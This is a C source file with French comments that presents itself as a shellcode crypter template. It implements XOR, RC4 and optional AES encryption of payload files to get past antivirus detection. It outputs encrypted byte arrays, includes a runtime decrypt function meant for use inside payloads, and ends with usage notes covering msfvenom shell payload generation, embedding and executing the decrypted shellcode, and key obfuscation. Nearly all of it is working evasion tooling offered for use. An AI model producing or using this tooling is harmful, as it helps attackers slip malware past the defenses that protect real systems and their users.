/*
 * Template: Shellcode Crypter/Decrypter
 * Support XOR, AES-128, RC4
 * Encode/decode shellcode pour bypass AV
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// ============================================================================
// XOR Cipher (simple mais efficace)
// ============================================================================

void xor_crypt(unsigned char *data, size_t size, unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key_len];
    }
}

// ============================================================================
// RC4 Cipher
// ============================================================================

typedef struct {
    unsigned char S[256];
    int i;
    int j;
} rc4_context;

void rc4_init(rc4_context *ctx, unsigned char *key, size_t key_len) {
    int i, j = 0;
    unsigned char temp;

    // Initialize S
    for (i = 0; i < 256; i++) {
        ctx->S[i] = i;
    }

    // KSA (Key Scheduling Algorithm)
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) % 256;
        // Swap
        temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }

    ctx->i = 0;
    ctx->j = 0;
}

void rc4_crypt(rc4_context *ctx, unsigned char *data, size_t size) {
    unsigned char temp;

    for (size_t k = 0; k < size; k++) {
        ctx->i = (ctx->i + 1) % 256;
        ctx->j = (ctx->j + ctx->S[ctx->i]) % 256;

        // Swap
        temp = ctx->S[ctx->i];
        ctx->S[ctx->i] = ctx->S[ctx->j];
        ctx->S[ctx->j] = temp;

        // XOR with keystream
        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) % 256];
    }
}

// ============================================================================
// AES-128 (simplifié - utiliser library crypto pour production)
// ============================================================================

// Note: Implémentation complète AES trop longue
// Utiliser OpenSSL/mbedTLS pour production
// Exemple stub:

#ifdef USE_AES
#include <openssl/aes.h>
#include <openssl/rand.h>

void aes_encrypt(unsigned char *plaintext, size_t size,
                  unsigned char *key, unsigned char *iv,
                  unsigned char *ciphertext) {
    AES_KEY enc_key;
    AES_set_encrypt_key(key, 128, &enc_key);
    AES_cbc_encrypt(plaintext, ciphertext, size, &enc_key, iv, AES_ENCRYPT);
}

void aes_decrypt(unsigned char *ciphertext, size_t size,
                  unsigned char *key, unsigned char *iv,
                  unsigned char *plaintext) {
    AES_KEY dec_key;
    AES_set_decrypt_key(key, 128, &dec_key);
    AES_cbc_encrypt(ciphertext, plaintext, size, &dec_key, iv, AES_DECRYPT);
}
#endif

// ============================================================================
// Utilitaires
// ============================================================================

void print_hex(const char *label, unsigned char *data, size_t size) {
    printf("%s: ", label);
    for (size_t i = 0; i < size; i++) {
        printf("%02x ", data[i]);
    }
    printf("\n");
}

void print_c_array(unsigned char *data, size_t size) {
    printf("unsigned char encrypted[] = \n    \"");
    for (size_t i = 0; i < size; i++) {
        printf("\\x%02x", data[i]);
        if ((i + 1) % 16 == 0 && i < size - 1) {
            printf("\"\n    \"");
        }
    }
    printf("\";\n");
    printf("size_t encrypted_size = %zu;\n", size);
}

// ============================================================================
// Crypter mode (encoder shellcode)
// ============================================================================

int crypter_mode(const char *input_file, const char *output_file, const char *method, unsigned char *key, size_t key_len) {
    FILE *fin, *fout;
    unsigned char *buffer;
    long file_size;

    // Lire fichier input
    fin = fopen(input_file, "rb");
    if (!fin) {
        perror("fopen input");
        return -1;
    }

    fseek(fin, 0, SEEK_END);
    file_size = ftell(fin);
    fseek(fin, 0, SEEK_SET);

    buffer = malloc(file_size);
    if (fread(buffer, 1, file_size, fin) != file_size) {
        perror("fread");
        fclose(fin);
        free(buffer);
        return -1;
    }

    fclose(fin);

    printf("[*] Input size: %ld bytes\n", file_size);
    print_hex("Original (first 16)", buffer, (file_size > 16) ? 16 : file_size);

    // Chiffrer selon méthode
    if (strcmp(method, "xor") == 0) {
        printf("[*] Chiffrement XOR...\n");
        xor_crypt(buffer, file_size, key, key_len);
    } else if (strcmp(method, "rc4") == 0) {
        printf("[*] Chiffrement RC4...\n");
        rc4_context ctx;
        rc4_init(&ctx, key, key_len);
        rc4_crypt(&ctx, buffer, file_size);
    }
#ifdef USE_AES
    else if (strcmp(method, "aes") == 0) {
        printf("[*] Chiffrement AES-128...\n");
        unsigned char iv[16] = {0}; // IV zero pour exemple
        unsigned char *encrypted = malloc(file_size + 16); // Padding
        aes_encrypt(buffer, file_size, key, iv, encrypted);
        free(buffer);
        buffer = encrypted;
    }
#endif
    else {
        printf("[-] Méthode inconnue: %s\n", method);
        free(buffer);
        return -1;
    }

    print_hex("Encrypted (first 16)", buffer, (file_size > 16) ? 16 : file_size);

    // Écrire fichier output
    fout = fopen(output_file, "wb");
    if (!fout) {
        perror("fopen output");
        free(buffer);
        return -1;
    }

    fwrite(buffer, 1, file_size, fout);
    fclose(fout);

    printf("[+] Fichier chiffré sauvegardé: %s\n\n", output_file);

    // Afficher C array
    printf("=== C Array ===\n");
    print_c_array(buffer, file_size);

    free(buffer);
    return 0;
}

// ============================================================================
// Decrypter mode (runtime - dans payload)
// ============================================================================

unsigned char *decrypt_shellcode(unsigned char *encrypted, size_t size,
                                   const char *method, unsigned char *key, size_t key_len) {
    unsigned char *decrypted = malloc(size);
    memcpy(decrypted, encrypted, size);

    if (strcmp(method, "xor") == 0) {
        xor_crypt(decrypted, size, key, key_len);
    } else if (strcmp(method, "rc4") == 0) {
        rc4_context ctx;
        rc4_init(&ctx, key, key_len);
        rc4_crypt(&ctx, decrypted, size);
    }

    return decrypted;
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char *argv[]) {
    printf("=== Shellcode Crypter ===\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  Crypter:   %s encrypt <input> <output> <method> <key>\n", argv[0]);
        printf("  Decrypter: %s decrypt <encrypted_file> <method> <key>\n", argv[0]);
        printf("\nMéthodes: xor, rc4");
#ifdef USE_AES
        printf(", aes");
#endif
        printf("\n\nExemples:\n");
        printf("  %s encrypt shellcode.bin encrypted.bin xor MySecretKey\n", argv[0]);
        printf("  %s encrypt shellcode.bin encrypted.bin rc4 MyKey123\n", argv[0]);
        return 1;
    }

    const char *mode = argv[1];

    if (strcmp(mode, "encrypt") == 0) {
        if (argc < 6) {
            printf("[-] Arguments manquants pour encrypt\n");
            return 1;
        }

        const char *input = argv[2];
        const char *output = argv[3];
        const char *method = argv[4];
        unsigned char *key = (unsigned char *)argv[5];
        size_t key_len = strlen((char *)key);

        return crypter_mode(input, output, method, key, key_len);
    }
    else if (strcmp(mode, "decrypt") == 0) {
        if (argc < 5) {
            printf("[-] Arguments manquants pour decrypt\n");
            return 1;
        }

        const char *input = argv[2];
        const char *method = argv[3];
        unsigned char *key = (unsigned char *)argv[4];
        size_t key_len = strlen((char *)key);

        // Lire fichier chiffré
        FILE *fp = fopen(input, "rb");
        if (!fp) {
            perror("fopen");
            return -1;
        }

        fseek(fp, 0, SEEK_END);
        long size = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        unsigned char *encrypted = malloc(size);
        fread(encrypted, 1, size, fp);
        fclose(fp);

        // Déchiffrer
        unsigned char *decrypted = decrypt_shellcode(encrypted, size, method, key, key_len);

        print_hex("Decrypted (first 16)", decrypted, (size > 16) ? 16 : size);

        // Sauvegarder
        fp = fopen("decrypted.bin", "wb");
        fwrite(decrypted, 1, size, fp);
        fclose(fp);

        printf("[+] Fichier déchiffré: decrypted.bin\n");

        free(encrypted);
        free(decrypted);
        return 0;
    }
    else {
        printf("[-] Mode inconnu: %s\n", mode);
        return 1;
    }

    return 0;
}

/*
 * Compilation:
 *   # Sans AES
 *   gcc crypter.c -o crypter
 *
 *   # Avec AES (nécessite OpenSSL)
 *   gcc -DUSE_AES crypter.c -o crypter -lssl -lcrypto
 *
 * Usage:
 *   # Générer shellcode
 *   msfvenom -p linux/x64/exec CMD=/bin/sh -f raw > shellcode.bin
 *
 *   # Chiffrer avec XOR
 *   ./crypter encrypt shellcode.bin encrypted.bin xor MyKey123
 *
 *   # Chiffrer avec RC4
 *   ./crypter encrypt shellcode.bin encrypted.bin rc4 MySecretKey
 *
 *   # Déchiffrer
 *   ./crypter decrypt encrypted.bin xor MyKey123
 *
 * Intégration dans payload:
 *   unsigned char encrypted[] = "\x48\x31\xf6..."; // Depuis output
 *   unsigned char key[] = "MyKey123";
 *   unsigned char *shellcode = decrypt_shellcode(encrypted, sizeof(encrypted)-1, "xor", key, sizeof(key)-1);
 *   // Execute shellcode...
 *
 * Notes:
 *   - XOR: simple, rapide, mais faible si key courte
 *   - RC4: meilleur, legacy mais OK pour obfuscation
 *   - AES: fort, mais nécessite library (plus gros binaire)
 *   - Pour production: AES-256-GCM ou ChaCha20
 *   - Key doit être obfusquée dans binaire final
 */
